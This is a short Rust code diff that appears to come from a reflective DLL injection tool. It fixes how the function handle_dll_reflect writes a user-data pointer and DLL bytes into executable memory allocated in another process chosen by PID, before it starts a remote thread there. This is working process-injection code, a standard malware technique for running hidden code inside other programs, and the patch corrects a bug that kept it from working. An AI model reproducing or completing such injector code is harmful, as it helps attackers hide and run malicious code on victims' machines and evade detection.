@@ -1,3 +1,4 @@
+use std::io::Read;
 use std::{os::raw::c_void, ptr::null_mut};
 use object::{Object, ObjectSection};
 use object::LittleEndian as LE;
@@ -161,7 +162,7 @@ fn handle_dll_reflect(target_dll_bytes: Vec<u8>, pid:u32, function_name: &str) -
         std::mem::size_of::<UserData>())?;
 
     // Allocate and write function offset + payload to remote process
-    let user_data_ptr_size = std::mem::size_of::<*const UserData>();
+    let user_data_ptr_size = std::mem::size_of::<u64>();
     let remote_buffer_target_dll: *mut std::ffi::c_void = virtual_alloc_ex(
         process_handle,
         null_mut(),
@@ -169,12 +170,13 @@ fn handle_dll_reflect(target_dll_bytes: Vec<u8>, pid:u32, function_name: &str) -
         MEM_COMMIT | MEM_RESERVE,
         PAGE_EXECUTE_READWRITE)?;
 
-    // Write the pointer to the start of the dll bytes being passed as a param. 
+    // Write user data ptr to start of param.
+    let user_data_ptr_as_bytes = (remote_buffer_user_data as usize).to_le_bytes(); // The address in a slice little endian. Eg. 0xff01 = [01, ff]
     let user_data_ptr_in_remote_buffer = remote_buffer_target_dll as usize;
     let _payload_bytes_written = write_process_memory(
         process_handle,
         user_data_ptr_in_remote_buffer as _,
-        target_dll_bytes.as_slice().as_ptr() as _,
+        user_data_ptr_as_bytes.as_slice().as_ptr() as *const _,
         user_data_ptr_size)?;
     
     // Write dll_bytes at buffer + size of pointer to user data (should be usize)
@@ -200,7 +202,7 @@ fn handle_dll_reflect(target_dll_bytes: Vec<u8>, pid:u32, function_name: &str) -
         remote_buffer_target_dll,
         0,
         null_mut())?;
-
+    
     Ok(())
 }
 
